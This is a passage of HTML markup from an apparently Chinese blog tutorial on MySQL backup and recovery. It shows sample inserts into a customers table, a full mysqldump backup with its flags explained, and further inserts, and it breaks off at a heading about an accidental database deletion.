class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-26\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.02</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-28\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"wangbo\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"24\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-29\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-30\"> </div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-31\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"guohui\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"22\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-32\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-34\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"zhangheng\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"27\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-35\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.09</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-36\"> </div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-37\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">customers</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-38\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-39\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">age</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-40\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-41\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wangbo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-42\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">guohui</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-43\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">zhangheng</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae8fd931966668-44\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae8fd931966668-45\"><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0182 seconds] -->\r\n<p><strong>（2）现在进行全备份</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae902731647058\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@vm-002 ~]# mysqldump -uroot -p -B -F -R -x --master-data=2 ops|gzip &gt;/opt/backup/ops_$(date +%F).sql.gz\r\nEnter password:\r\n[root@vm-002 ~]# ls /opt/backup/\r\nops_2016-09-25.sql.gz</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae902731647058-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae902731647058-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae902731647058-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae902731647058-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae902731647058-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># mysqldump -uroot -p -B -F -R -x --master-data=2 ops|gzip &gt;/opt/backup/ops_$(date +%F).sql.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae902731647058-2\"><span class=\"crayon-e\">Enter </span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae902731647058-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">vm</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">002</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">]</span><span class=\"crayon-p\"># ls /opt/backup/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae902731647058-4\"><span class=\"crayon-v\">ops_2016</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">09</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">25.sql.gz</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>参数说明：</p>\n<blockquote><p>-B：指定数据库<br>\n-F：刷新日志<br>\n-R：备份存储过程等<br>\n-x：锁表<br>\n–master-data：在备份语句里添加CHANGE MASTER语句以及binlog文件及位置点信息</p></blockquote>\n<p><strong>（3）再次插入数据</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05eaae906453454086\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; insert into customers values(4,\"liupeng\",\"21\");\r\nQuery OK, 1 row affected (0.06 sec)\r\n\r\nmysql&gt; insert into customers values(5,\"xiaoda\",\"31\");\r\nQuery OK, 1 row affected (0.07 sec)\r\n\r\nmysql&gt; insert into customers values(6,\"fuaiai\",\"26\");\r\nQuery OK, 1 row affected (0.06 sec)\r\n\r\nmysql&gt; select * from customers;\r\n+----+-----------+-----+\r\n| id | name | age |\r\n+----+-----------+-----+\r\n| 1 | wangbo | 24 |\r\n| 2 | guohui | 22 |\r\n| 3 | zhangheng | 27 |\r\n| 4 | liupeng | 21 |\r\n| 5 | xiaoda | 31 |\r\n| 6 | fuaiai | 26 |\r\n+----+-----------+-----+\r\n6 rows in set (0.00 sec)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05eaae906453454086-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594b05eaae906453454086-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"liupeng\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"21\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-2\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-4\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"xiaoda\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"31\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-5\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.07</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-6\"> </div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-7\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">customers </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"fuaiai\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"26\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-8\"><span class=\"crayon-e\">Query </span><span class=\"crayon-v\">OK</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">row </span><span class=\"crayon-e\">affected</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.06</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-10\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">customers</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-11\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-12\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">age</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-13\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-14\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wangbo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-15\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">guohui</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-16\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">zhangheng</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-17\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">liupeng</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">21</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-18\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">xiaoda</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-19\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fuaiai</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05eaae906453454086-20\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-594b05eaae906453454086-21\"><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sec</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0051 seconds] -->\r\n<p><strong>（4）此时误操作，删除了test数据库</strong></p><!-- 